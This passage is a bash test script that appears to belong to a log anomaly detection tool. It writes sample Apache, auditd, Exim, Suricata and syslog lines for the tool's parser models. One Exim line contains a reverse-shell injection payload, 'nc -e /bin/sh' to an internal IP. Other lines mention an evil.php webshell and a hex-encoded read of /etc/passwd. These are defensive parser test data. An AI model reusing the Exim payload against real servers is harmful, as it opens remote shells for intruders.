#!/bin/bash

. ./testFunctions.sh

sudo mkdir /tmp/lib 2> /dev/null
sudo mkdir /tmp/lib/aminer 2> /dev/null
sudo chown -R $USER:$USER /tmp/lib/aminer 2> /dev/null
sudo rm -r /tmp/lib/aminer/* 2> /dev/null
sudo mkdir /tmp/lib/aminer/log 2> /dev/null
sudo chown -R aminer:aminer /tmp/lib/aminer 2> /dev/null
sudo rm /tmp/syslog 2> /dev/null

exit_code=0

CONFIG_PATH=/tmp/config.yml
OUT=/tmp/output.txt
LOGFILE=/tmp/log.txt
#PATH_AIT_LDS=../source/root/etc/aminer/conf-available/ait-lds/*.py
PATH_AIT_LDS=/etc/aminer/conf-available/ait-lds/*.py
#PATH_AIT_LDS2=../source/root/etc/aminer/conf-available/ait-lds2/*.py
PATH_AIT_LDS2=/etc/aminer/conf-available/ait-lds2/*.py
#PATH_GENERIC=../source/root/etc/aminer/conf-available/generic/*.py
PATH_GENERIC=/etc/aminer/conf-available/generic/*.py

cntr=0
files=()

for filename in $PATH_AIT_LDS; do
    files[$cntr]=$filename
    let cntr=cntr+1
done

for filename in $PATH_AIT_LDS2; do
    files[$cntr]=$filename
    let cntr=cntr+1
done

for filename in $PATH_GENERIC; do
    files[$cntr]=$filename
    let cntr=cntr+1
done

for filename in ${files[@]}; do
    cat > $CONFIG_PATH <<EOL
LearnMode: True
Core.PersistenceDir: '/tmp/lib/aminer'

LogResourceList:
        - 'file://$LOGFILE'

EventHandlers:
        - id: stpe
          type: StreamPrinterEventHandler

Input:
        timestamp_paths: ["/accesslog/time"]
EOL

    BN=`basename "$filename" .py`
    echo "Testing $BN"
    case $BN in
        ApacheAccessParsingModel)
            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOGFILE
            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOGFILE
            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOGFILE
            ;;
        ApacheErrorParsingModel)
            echo '[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  Declaration of Horde_Form_Type_pgp::init($gpg, $temp_dir = NULL, $rows = NULL, $cols = NULL) should be compatible with Horde_Form_Type_longtext::init($rows = 8, $cols = 80, $helper = Array) in /usr/share/php/Horde/Form/Type.php on line 878, referer: http://mail.cup.com/nag/' > $LOGFILE
            echo "[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  system(): Cannot execute a blank command in words.php on line 12" > $LOGFILE
            echo "[Wed Mar 04 19:32:45.144442 2020] [:error] [pid 8738] [client 192.168.10.238:60488] PHP Notice:  Undefined index: cmd in /var/www/mail.cup.com/static/evil.php on line 1" >> $LOGFILE
            echo "[Wed Mar 04 06:26:43.756548 2020] [:error] [pid 22069] [client 192.168.10.190:33604] PHP Deprecated:  Methods with the same name as their class will not be constructors in a future version of PHP; Horde_Form_Variable has a deprecated constructor in /usr/share/php/Horde/Form/Variable.php on line 24, referer: http://mail.cup.com/nag/" >> $LOGFILE
            ;;
        AuditdParsingModel)
            echo 'type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' > $LOGFILE
            echo 'type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOGFILE
            echo 'type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOGFILE
            echo 'type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOGFILE
            echo 'type=LOGIN msg=audit(1582935421.373:947570): pid=25821 uid=0 old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=22 res=1' >> $LOGFILE
            echo "type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOGFILE
            echo "type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOGFILE
            echo 'type=CRED_REFR msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=USER_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=USER_ACCT msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=USER_AUTH msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=CRED_DISP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=SERVICE_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=SERVICE_STOP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=USER_END msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=USER_CMD msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=CRED_ACQ msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOGFILE
            echo 'type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOGFILE
            ;;
        EximParsingModel)
            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOGFILE
            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOGFILE
            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOGFILE
            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOGFILE
            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOGFILE
            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOGFILE
            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOGFILE
            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOGFILE
            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOGFILE
            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOGFILE
            ;;
        SuricataEventParsingModel)
            echo '{"timestamp":"2020-02-29T00:00:12.734324+0000","flow_id":914989792375924,"in_iface":"eth0","event_type":"dns","src_ip":"192.168.10.154","src_port":53985,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","dns":{"type":"query","id":30266,"rrname":"190.10.168.192.in-addr.arpa","rrtype":"PTR","tx_id":0}}' > $LOGFILE
            echo '{"timestamp":"2020-02-29T00:00:14.000538+0000","flow_id":1357371404246463,"event_type":"flow","src_ip":"192.168.10.154","src_port":46289,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","app_proto":"dns","flow":{"pkts_toserver":1,"pkts_toclient":1,"bytes_toserver":87,"bytes_toclient":142,"start":"2020-02-28T23:55:12.974271+0000","end":"2020-02-28T23:55:13.085657+0000","age":1,"state":"established","reason":"timeout","alerted":false}}' >> $LOGFILE
            echo '{"timestamp":"2020-02-29T00:00:14.886252+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"http","src_ip":"192.168.10.190","src_port":39438,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":1,"http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326}}' >> $LOGFILE
            echo '{"timestamp":"2020-02-29T00:00:14.977952+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"fileinfo","src_ip":"192.168.10.154","src_port":80,"dest_ip":"192.168.10.190","dest_port":39438,"proto":"TCP","http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326},"app_proto":"http","fileinfo":{"filename":"\/services\/portal\/","state":"CLOSED","stored":false,"size":41080,"tx_id":1}}' >> $LOGFILE
            echo '{"timestamp":"2020-02-29T00:00:18.000491+0000","event_type":"stats","stats":{"uptime":17705,"capture":{"kernel_packets":337720,"kernel_drops":0},"decoder":{"pkts":337749,"bytes":229373623,"invalid":3062,"ipv4":335528,"ipv6":10,"ethernet":337749,"raw":0,"null":0,"sll":0,"tcp":317611,"udp":14805,"sctp":0,"icmpv4":50,"icmpv6":10,"ppp":0,"pppoe":0,"gre":0,"vlan":0,"vlan_qinq":0,"teredo":0,"ipv4_in_ipv6":0,"ipv6_in_ipv6":0,"mpls":0,"avg_pkt_size":679,"max_pkt_size":1486,"erspan":0,"ipraw":{"invalid_ip_version":0},"ltnull":{"pkt_too_small":0,"unsupported_type":0},"dce":{"pkt_too_small":0}},"flow":{"memcap":0,"spare":10001,"emerg_mode_entered":0,"emerg_mode_over":0,"tcp_reuse":0,"memuse":7104256},"defrag":{"ipv4":{"fragments":0,"reassembled":0,"timeouts":0},"ipv6":{"fragments":0,"reassembled":0,"timeouts":0},"max_frag_hits":0},"tcp":{"sessions":7155,"ssn_memcap_drop":0,"pseudo":1082,"pseudo_failed":0,"invalid_checksum":0,"no_flow":0,"syn":7418,"synack":7307,"rst":3226,"segment_memcap_drop":0,"stream_depth_reached":0,"reassembly_gap":375,"memuse":819200,"reassembly_memuse":12281632},"detect":{"alert":58},"app_layer":{"flow":{"http":4883,"ftp":0,"smtp":0,"tls":1564,"ssh":0,"imap":0,"msn":0,"smb":0,"dcerpc_tcp":0,"dns_tcp":0,"failed_tcp":258,"dcerpc_udp":0,"dns_udp":6951,"failed_udp":119},"tx":{"http":13248,"smtp":0,"tls":0,"dns_tcp":0,"dns_udp":7185}},"flow_mgr":{"closed_pruned":7112,"new_pruned":21,"est_pruned":6999,"bypassed_pruned":0,"flows_checked":1,"flows_notimeout":0,"flows_timeout":1,"flows_timeout_inuse":0,"flows_removed":1,"rows_checked":65536,"rows_skipped":65535,"rows_empty":0,"rows_busy":0,"rows_maxlen":1},"dns":{"memuse":24462,"memcap_state":0,"memcap_global":0},"http":{"memuse":61601,"memcap":0}}}' >> $LOGFILE
            echo '{"timestamp":"2020-02-29T00:01:53.976648+0000","flow_id":378741657290945,"in_iface":"eth0","event_type":"tls","src_ip":"192.168.10.238","src_port":53156,"dest_ip":"192.168.10.154","dest_port":443,"proto":"TCP","tls":{"subject":"CN=mail.cup.com","issuerdn":"CN=ChangeMe","fingerprint":"12:7a:88:ea:52:10:62:44:f0:c5:33:8a:28:2d:ad:12:a1:4e:7e:18","sni":"mail.cup.com","version":"TLS 1.2","notbefore":"2020-02-28T18:40:23","notafter":"2030-02-25T18:40:23"}}' >> $LOGFILE
            echo '{"timestamp":"2020-02-29T06:11:02.147044+0000","flow_id":415686269975930,"in_iface":"eth0","event_type":"alert","src_ip":"192.168.10.238","src_port":50850,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":0,"alert":{"action":"allowed","gid":1,"signature_id":2012887,"rev":3,"signature":"ET POLICY Http Client Body contains pass= in cleartext","category":"Potential Corporate Privacy Violation","severity":1},"http":{"hostname":"mail.cup.com","url":"\/login.php","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"POST","protocol":"HTTP\/1.1","status":302,"redirect":"\/services\/portal\/","length":20}}' >> $LOGFILE
            ;;
        SuricataFastParsingModel)
            echo "02/29/2020-00:00:13.674931  [**] [1:2012887:3] ET POLICY Http Client Body contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.10.190:39438 -> 192.168.10.154:80" > $LOGFILE
            ;;
        SyslogParsingModel)
            echo "Feb 29 00:01:41 mail-0 dovecot: imap(kelsey): Logged out in=79 out=875" > $LOGFILE
            echo "Mar  1 06:25:38 mail dovecot: imap(lino): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:38]" >> $LOGFILE
            echo "Feb 29 00:01:44 mail-0 dovecot: imap(della): Error: file_dotlock_create(/var/mail/della) failed: Permission denied (euid=1013(della) egid=1013(della) missing +w perm: /var/mail, we're not in group 8(mail), dir owned by 0:8 mode=0775) (set mail_privileged_group=mail)" >> $LOGFILE
            echo "Mar  1 06:25:41 mail dovecot: imap(idella): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:41]" >> $LOGFILE
            echo "Mar  4 14:14:36 mail dovecot: imap-login: Disconnected (auth failed, 2 attempts in 12 secs): user=<violet>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, secured, session=<fEeWCQigUph/AAAB>" >> $LOGFILE
            echo "Mar  4 18:43:05 mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.10.185, lip=192.168.10.177, session=<cjd4ygugaJTAqAq5>" >> $LOGFILE
            echo "Mar  4 13:51:48 mail dovecot: imap-login: Disconnected (disconnected before auth was ready, waited 0 secs): user=<>, rip=192.168.10.18, lip=192.168.10.21, session=<+KO9uAeg4sPAqAoS>" >> $LOGFILE
            echo "Mar  4 18:43:59 mail dovecot: imap-login: Login: user=<sadye>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, mpid=11475, secured, session=<8ZitzQugnrh/AAAB>" >> $LOGFILE
            echo "Feb 29 11:39:45 mail-0 dovecot: imap-login: Error: anvil: Anvil queries timed out after 5 secs - aborting queries" >> $LOGFILE
            echo "Feb 29 09:15:59 mail-1 dovecot: imap-login: Warning: Auth process not responding, delayed sending initial response (greeting): user=<>, rip=127.0.0.1, lip=127.0.0.1, secured, session=<dVUEZ7OfnLl/AAAB>" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: auth: Error: auth worker: Aborted PASSV request for marjory: Worker process died unexpectedly" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: auth-worker(2233): Fatal: Error reading configuration: Timeout reading config from /var/run/dovecot/config" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: master: Error: service(auth-worker): command startup failed, throttling for 2 secs" >> $LOGFILE
            echo 'Feb 29 11:39:46 mail-2 HORDE: [imp] Login success for marjory (192.168.10.18) to {imap://localhost/} [pid 1764 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOGFILE
            echo 'Feb 29 17:18:23 mail-2 HORDE: [imp] Message sent to marcelle@mail.insect.com, merlene@mail.insect.com from les (192.168.10.18) [pid 9596 on line 970 of "/var/www/mail.insect.com/imp/lib/Compose.php"]' >> $LOGFILE
            echo 'Feb 29 20:01:48 mail-2 HORDE: [imp] FAILED LOGIN for violet (192.168.10.18) to {imap://localhost/} [pid 14794 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOGFILE
            echo 'Mar  1 06:25:38 mail HORDE: [imp] [status] Could not open mailbox "INBOX". [pid 999 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Mar  1 06:27:56 mail HORDE: [imp] [getSyncToken] IMAP error reported by server. [pid 1127 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Feb 29 12:12:54 mail-2 HORDE: [horde] Login success for dorie to horde (192.168.10.18) [pid 2272 on line 163 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Feb 29 12:13:00 mail-2 HORDE: [horde] User marjory logged out of Horde (192.168.10.18) [pid 2988 on line 106 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Feb 29 17:07:07 mail-2 HORDE: [horde] FAILED LOGIN for marcelle to horde (192.168.10.98) [pid 8517 on line 198 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Mar  1 18:22:40 mail HORDE: [imp] [login] Authentication failed. [pid 12890 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Mar  4 18:55:05 mail HORDE: [turba] PHP ERROR: finfo_file(): Empty filename or path [pid 11642 on line 166 of "/usr/share/php/Horde/Mime/Magic.php"]' >> $LOGFILE
            echo 'Mar  4 18:50:51 mail HORDE: [horde] PHP ERROR: Cannot modify header information - headers already sent [pid 11019 on line 0 of "Unknown"]' >> $LOGFILE
            echo 'Mar  4 18:01:23 mail HORDE: Guest user is not authorized for Horde (Host: 192.168.10.81). [pid 4815 on line 324 of "/usr/share/php/Horde/Registry.php"]' >> $LOGFILE
            echo 'Mar  4 18:10:08 mail HORDE: PHP ERROR: rawurlencode() expects parameter 1 to be string, array given [pid 6556 on line 302 of "/usr/share/php/Horde/Url.php"]' >> $LOGFILE
            # missing model/service/horde/horde/free_msg - no log found!
            echo "Feb 29 12:39:02 mail-0 CRON[11260]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)" >> $LOGFILE
            echo "Feb 29 06:25:01 mail-1 CRON[27486]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOGFILE
            echo "Feb 29 15:42:36 mail-1 auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=marcelino rhost=127.0.0.1  user=marcelino" >> $LOGFILE
            echo "Mar  1 03:09:18 mail-0 systemd[1]: Starting Clean php session files..." >> $LOGFILE
            echo "Mar  1 03:09:19 mail-0 systemd[1]: Started Clean php session files." >> $LOGFILE
            echo "Mar  1 18:26:18 mail systemd[1]: Starting Cleanup of Temporary Directories..." >> $LOGFILE
            echo "Mar  1 18:26:18 mail systemd[1]: Started Cleanup of Temporary Directories." >> $LOGFILE
            echo "Mar  2 06:37:52 mail systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOGFILE
            echo "Mar  2 06:37:53 mail systemd[1]: Started Daily apt upgrade and clean activities." >> $LOGFILE
            echo "Mar  2 12:30:18 mail systemd[1]: Starting Daily apt download activities..." >> $LOGFILE
            echo "Mar  2 12:30:19 mail systemd[1]: Started Daily apt download activities." >> $LOGFILE
            echo "Mar  3 06:29:00 mail systemd[1]: Starting Security Auditing Service..." >> $LOGFILE
            echo "Mar  3 06:29:00 mail systemd[1]: Started Security Auditing Service." >> $LOGFILE
            echo "Mar  4 06:29:05 mail systemd[1]: Stopping Security Auditing Service..." >> $LOGFILE
            echo "Mar  4 06:29:05 mail systemd[1]: Stopped Security Auditing Service." >> $LOGFILE
            echo "Mar  5 06:25:35 mail systemd[1]: Reloading The Apache HTTP Server." >> $LOGFILE
            echo "Mar  5 06:25:35 mail systemd[1]: Reloaded The Apache HTTP Server." >> $LOGFILE
            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounting Arbitrary Executable File Formats File System..." >> $LOGFILE
            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounted Arbitrary Executable File Formats File System." >> $LOGFILE
            echo "Feb 29 13:56:59 mail-2 systemd[1]: apt-daily.timer: Adding 6h 4min 46.743459s random time." >> $LOGFILE
            # missing model/service/systemd/service - no log found!
            echo "Feb 29 07:24:02 mail-0 kernel: [47678.309129]  [<ffffffff92e1e577>] ? ret_from_fork+0x57/0x70" >> $LOGFILE
            echo "Mar  5 06:29:07 mail augenrules[17378]: backlog_wait_time 0" >> $LOGFILE
            echo "Mar  5 06:29:07 mail auditd[17377]: dispatch error reporting limit reached - ending report notification." >> $LOGFILE
            echo "Mar  5 06:29:07 mail auditd: audit log is not writable by owner" >> $LOGFILE
            echo "Mar  4 06:29:05 mail audispd: No plugins found, exiting" >> $LOGFILE
            echo 'Mar  3 06:29:01 mail liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="480" x-info="http://www.rsyslog.com"] rsyslogd was HUPed' >> $LOGFILE
            echo "Mar  1 09:25:16 mail freshclam[22090]: Sun Mar  1 09:25:16 2020 -> bytecode.cvd is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)" >> $LOGFILE
            echo "Mar  1 07:26:09 mail dhclient[418]: DHCPREQUEST of 192.168.10.21 on eth0 to 192.168.10.2 port 67" >> $LOGFILE
            echo "Mar  1 00:59:38 mail-2 dhclient[387]: DHCPACK of 192.168.10.21 from 192.168.10.2" >> $LOGFILE
            echo "Feb 29 21:12:42 mail-2 dhclient[418]: bound to 192.168.10.21 -- renewal in 36807 seconds." >> $LOGFILE
            ;;
        SyslogParsingModelAIT-LDSv1)
            echo "Feb 29 00:01:41 mail-0 dovecot: imap(kelsey): Logged out in=79 out=875" > $LOGFILE
            echo "Mar  1 06:25:38 mail dovecot: imap(lino): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:38]" >> $LOGFILE
            echo "Feb 29 00:01:44 mail-0 dovecot: imap(della): Error: file_dotlock_create(/var/mail/della) failed: Permission denied (euid=1013(della) egid=1013(della) missing +w perm: /var/mail, we're not in group 8(mail), dir owned by 0:8 mode=0775) (set mail_privileged_group=mail)" >> $LOGFILE
            echo "Mar  1 06:25:41 mail dovecot: imap(idella): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:41]" >> $LOGFILE
            echo "Mar  4 14:14:36 mail dovecot: imap-login: Disconnected (auth failed, 2 attempts in 12 secs): user=<violet>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, secured, session=<fEeWCQigUph/AAAB>" >> $LOGFILE
            echo "Mar  4 18:43:05 mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.10.185, lip=192.168.10.177, session=<cjd4ygugaJTAqAq5>" >> $LOGFILE
            echo "Mar  4 13:51:48 mail dovecot: imap-login: Disconnected (disconnected before auth was ready, waited 0 secs): user=<>, rip=192.168.10.18, lip=192.168.10.21, session=<+KO9uAeg4sPAqAoS>" >> $LOGFILE
            echo "Mar  4 18:43:59 mail dovecot: imap-login: Login: user=<sadye>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, mpid=11475, secured, session=<8ZitzQugnrh/AAAB>" >> $LOGFILE
            echo "Feb 29 11:39:45 mail-0 dovecot: imap-login: Error: anvil: Anvil queries timed out after 5 secs - aborting queries" >> $LOGFILE
            echo "Feb 29 09:15:59 mail-1 dovecot: imap-login: Warning: Auth process not responding, delayed sending initial response (greeting): user=<>, rip=127.0.0.1, lip=127.0.0.1, secured, session=<dVUEZ7OfnLl/AAAB>" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: auth: Error: auth worker: Aborted PASSV request for marjory: Worker process died unexpectedly" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: auth-worker(2233): Fatal: Error reading configuration: Timeout reading config from /var/run/dovecot/config" >> $LOGFILE
            echo "Feb 29 11:39:35 mail-2 dovecot: master: Error: service(auth-worker): command startup failed, throttling for 2 secs" >> $LOGFILE
            echo 'Feb 29 11:39:46 mail-2 HORDE: [imp] Login success for marjory (192.168.10.18) to {imap://localhost/} [pid 1764 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOGFILE
            echo 'Feb 29 17:18:23 mail-2 HORDE: [imp] Message sent to marcelle@mail.insect.com, merlene@mail.insect.com from les (192.168.10.18) [pid 9596 on line 970 of "/var/www/mail.insect.com/imp/lib/Compose.php"]' >> $LOGFILE
            echo 'Feb 29 20:01:48 mail-2 HORDE: [imp] FAILED LOGIN for violet (192.168.10.18) to {imap://localhost/} [pid 14794 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOGFILE
            echo 'Mar  1 06:25:38 mail HORDE: [imp] [status] Could not open mailbox "INBOX". [pid 999 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Mar  1 06:27:56 mail HORDE: [imp] [getSyncToken] IMAP error reported by server. [pid 1127 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Feb 29 12:12:54 mail-2 HORDE: [horde] Login success for dorie to horde (192.168.10.18) [pid 2272 on line 163 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Feb 29 12:13:00 mail-2 HORDE: [horde] User marjory logged out of Horde (192.168.10.18) [pid 2988 on line 106 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Feb 29 17:07:07 mail-2 HORDE: [horde] FAILED LOGIN for marcelle to horde (192.168.10.98) [pid 8517 on line 198 of "/var/www/mail.insect.com/login.php"]' >> $LOGFILE
            echo 'Mar  1 18:22:40 mail HORDE: [imp] [login] Authentication failed. [pid 12890 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOGFILE
            echo 'Mar  4 18:55:05 mail HORDE: [turba] PHP ERROR: finfo_file(): Empty filename or path [pid 11642 on line 166 of "/usr/share/php/Horde/Mime/Magic.php"]' >> $LOGFILE
            echo 'Mar  4 18:50:51 mail HORDE: [horde] PHP ERROR: Cannot modify header information - headers already sent [pid 11019 on line 0 of "Unknown"]' >> $LOGFILE
            echo 'Mar  4 18:01:23 mail HORDE: Guest user is not authorized for Horde (Host: 192.168.10.81). [pid 4815 on line 324 of "/usr/share/php/Horde/Registry.php"]' >> $LOGFILE
            echo 'Mar  4 18:10:08 mail HORDE: PHP ERROR: rawurlencode() expects parameter 1 to be string, array given [pid 6556 on line 302 of "/usr/share/php/Horde/Url.php"]' >> $LOGFILE
            # missing model/service/horde/horde/free_msg - no log found!
            echo "Feb 29 12:39:02 mail-0 CRON[11260]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)" >> $LOGFILE
            echo "Feb 29 06:25:01 mail-1 CRON[27486]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOGFILE
            echo "Feb 29 15:42:36 mail-1 auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=marcelino rhost=127.0.0.1  user=marcelino" >> $LOGFILE
            echo "Mar  1 03:09:18 mail-0 systemd[1]: Starting Clean php session files..." >> $LOGFILE
            echo "Mar  1 03:09:19 mail-0 systemd[1]: Started Clean php session files." >> $LOGFILE
            echo "Mar  1 18:26:18 mail systemd[1]: Starting Cleanup of Temporary Directories..." >> $LOGFILE
            echo "Mar  1 18:26:18 mail systemd[1]: Started Cleanup of Temporary Directories." >> $LOGFILE
            echo "Mar  2 06:37:52 mail systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOGFILE
            echo "Mar  2 06:37:53 mail systemd[1]: Started Daily apt upgrade and clean activities." >> $LOGFILE
            echo "Mar  2 12:30:18 mail systemd[1]: Starting Daily apt download activities..." >> $LOGFILE
            echo "Mar  2 12:30:19 mail systemd[1]: Started Daily apt download activities." >> $LOGFILE
            echo "Mar  3 06:29:00 mail systemd[1]: Starting Security Auditing Service..." >> $LOGFILE
            echo "Mar  3 06:29:00 mail systemd[1]: Started Security Auditing Service." >> $LOGFILE
